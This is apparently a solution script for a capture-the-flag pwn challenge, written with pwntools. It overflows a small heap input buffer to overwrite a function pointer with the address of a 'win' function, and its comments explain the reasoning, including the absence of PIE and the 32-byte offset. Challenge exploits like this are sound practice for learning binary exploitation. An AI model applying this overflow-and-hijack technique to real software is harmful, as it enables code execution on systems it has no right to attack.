#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Debuginfo:  Yes

io = start()

io.info("PIE isn't compiled so we can just pull the symbol without a leak and write it")
io.info("check_win is calling the variable x as a function pointer (it's a string right now)")
io.info("to solve we just overflow input data (5 bytes -> 0x10 byte chunk) into x")
io.info("so we need to write 32 bytesto overwrite input and x's header, then &win")

io.sendline(b"2")
io.sendline(b"A" * 32 + p64(exe.symbols['win']))
io.sendline(b"4")

io.interactive()

